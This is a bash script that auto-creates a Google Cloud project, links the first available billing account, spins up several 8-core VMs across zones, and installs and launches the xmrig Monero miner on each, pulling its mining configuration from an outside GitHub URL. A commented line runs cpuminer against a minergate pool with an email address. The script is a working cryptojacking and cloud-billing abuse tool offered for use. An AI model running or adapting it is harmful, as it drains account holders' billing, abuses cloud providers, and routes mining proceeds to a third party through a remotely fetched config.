#!/bin/bash

EMAIL=$(gcloud auth list --format=json | jq -r '.[0].account')

PROJECT_PREFIX=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 8 | head -n 1)

PROJECT_ID=$(echo "${PROJECT_PREFIX}-$RANDOM")
echo "Creating project $PROJECT_ID for $EMAIL ... "

# create
gcloud projects create $PROJECT_ID

gcloud projects add-iam-policy-binding $PROJECT_ID --member="user:$EMAIL" --role='roles/owner'
gcloud config set project $PROJECT_ID
ACCOUNT_ID=$(gcloud alpha billing accounts list --format=json | jq -M -r '.[0].name' | cut -f2 -d"/")
sleep 2
gcloud alpha billing accounts projects link $PROJECT_ID --account-id=$ACCOUNT_ID

gcloud service-management enable --project $PROJECT_ID cloudbilling.googleapis.com
gcloud service-management enable --project $PROJECT_ID cloudapis.googleapis.com
gcloud service-management enable --project $PROJECT_ID dns.googleapis.com
gcloud service-management enable --project $PROJECT_ID compute.googleapis.com

gcloud projects describe $PROJECT_ID --format=json > project_meta.json

PROJECT_NUM=$(jq -r '.projectNumber' project_meta.json)

declare -a array=("us-east4-a" "us-west1-a" "us-central1-c") ##  "us-east1-b")
arraylength=${#array[@]}

if [ -e ~/.ssh/google_compute_engine ]
then
    echo "google_compute_engine ok"
else
    ssh-keygen -q -N "" -f ~/.ssh/google_compute_engine
fi

## now loop through the above array
for (( i=1; i<${arraylength}+1; i++ ));
do
  ( gcloud compute --project $PROJECT_ID instances create "instance-$i" --zone ${array[$i-1]} --machine-type "n1-standard-8" --subnet "default" --maintenance-policy "MIGRATE" --service-account "$PROJECT_NUM-compute@developer.gserviceaccount.com" --scopes "https://www.googleapis.com/auth/devstorage.read_only","https://www.googleapis.com/auth/logging.write","https://www.googleapis.com/auth/monitoring.write","https://www.googleapis.com/auth/servicecontrol","https://www.googleapis.com/auth/service.management.readonly","https://www.googleapis.com/auth/trace.append" --image "debian-9-stretch-v20170829" --image-project "debian-cloud" --boot-disk-size "10" --boot-disk-type "pd-standard" --boot-disk-device-name "instance-$i"
   # gcloud beta compute ssh "instance-$i" --zone ${array[$i-1]} --command "sudo apt-get install screen git unzip build-essential autotools-dev autoconf libcurl3 libcurl4-gnutls-dev automake -y && wget https://github.com/OhGodAPet/cpuminer-multi/archive/master.zip && unzip master.zip && cd ./cpuminer-multi-master && ./autogen.sh && CFLAGS=\"-march=native\" ./configure && make && nohup ./minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u englandnancy09@gmail.com -p x -t 14 2>&1 && exit" --ssh-flag="-f"
      gcloud beta compute ssh "instance-$i" --zone ${array[$i-1]} --quiet --command "sudo apt-get install git unzip tmux build-essential cmake libuv1-dev -y && wget https://github.com/xmrig/xmrig/archive/master.zip && unzip master.zip && cd ./xmrig-master && mkdir build && cd build && cmake .. && make && wget https://raw.githubusercontent.com/adv-zl/adv-zl.github.io/master/config.json && tmux new -d ./xmrig" ) &

   # or do whatever with individual element of the array
done
wait
